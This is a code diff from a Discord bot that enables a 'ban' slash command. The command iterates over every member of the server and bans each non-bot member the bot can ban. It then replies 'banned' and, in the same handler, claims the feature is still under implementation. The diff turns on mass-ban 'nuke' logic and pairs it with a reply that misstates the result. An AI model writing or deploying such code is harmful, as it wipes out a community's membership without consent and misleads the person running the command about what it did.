@@ -563,16 +563,17 @@ https://discord.gg/ctkp
   }
     if (interaction.commandName === 'ban') {
         await interaction.deferReply();
-        /*for(const d of JSON.parse(JSON.stringify(interaction.guild)).members){
+        for(const d of JSON.parse(JSON.stringify(interaction.guild)).members){
             
             	var p = await interaction.guild.members.fetch(d)
                 if(!p.bot){
-                console.log(p)
-            	try{p.roles.remove(p.roles.cache)}catch{(e)=>{console.log(e)}}
-                try{p.ban()}catch{(e)=>{console.log(e)}}
-                }
+                	console.log(p)
+			if(p.bannable){
+		 	 	p.ban()
+				}
+               		}
 		}
-        interaction.editReply("BANしました")*/
+        interaction.editReply("BANしました")
 		interaction.editReply("実装中の機能です。")
     }
 });
